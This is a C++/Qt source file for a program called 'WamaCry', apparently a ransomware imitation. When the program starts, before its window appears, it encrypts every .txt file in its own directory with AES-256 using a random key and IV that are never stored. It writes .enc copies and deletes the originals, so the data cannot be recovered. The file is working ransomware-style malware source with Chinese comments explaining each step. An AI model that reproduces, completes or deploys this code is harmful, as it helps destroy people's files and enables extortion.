#include "wamacry.h"
#include <QApplication>
#include <QDir>
#include <QFile>
#include <QTextStream>
#include <QCryptographicHash>
#include <QRandomGenerator>
#include "qaesencryption.h"

QByteArray generateRandomBytes(int length)
{
    QByteArray bytes(length, 0);
    for (int i = 0; i < length; ++i)
    {
        bytes[i] = static_cast<char>(QRandomGenerator::global()->generate() % 256);
    }
    return bytes;
}

QByteArray aesEncrypt(const QByteArray& plaintext, const QByteArray& key, const QByteArray& iv)
{
    QAESEncryption encryption(QAESEncryption::AES_256, QAESEncryption::CBC);
    return encryption.encode(plaintext, key, iv);
}

void handleTxtFiles()
{
    QString appDir = QCoreApplication::applicationDirPath();
    QDir dir(appDir);
    QStringList txtFiles = dir.entryList(QStringList() << "*.txt", QDir::Files);

    foreach(QString filename, txtFiles)
    {
        QFile file(dir.absoluteFilePath(filename));
        if (file.open(QIODevice::ReadWrite | QIODevice::Text))
        {
            QTextStream stream(&file);
            QString content = stream.readAll();
            file.close();

            // 生成随机 AES 密钥和 IV
            QByteArray key = generateRandomBytes(32); // 256 位密钥
            QByteArray iv = generateRandomBytes(16); // 128 位 IV
            QByteArray encrypted = aesEncrypt(content.toUtf8(), key, iv); // 使用 AES 加密内容
            QString encryptedFilename = filename + ".enc"; // 保存加密后的内容
            QFile encryptedFile(dir.absoluteFilePath(encryptedFilename));
            if (encryptedFile.open(QIODevice::WriteOnly))
            {
                encryptedFile.write(encrypted);
                encryptedFile.close();
            }

            file.remove(); // 删除原始文件
        }
    }
}

int main(int argc, char *argv[])
{
    handleTxtFiles(); // 在程序启动之前处理 txt 文件

    QApplication a(argc, argv);
    WamaCry w;
    w.show();
    return a.exec();
}
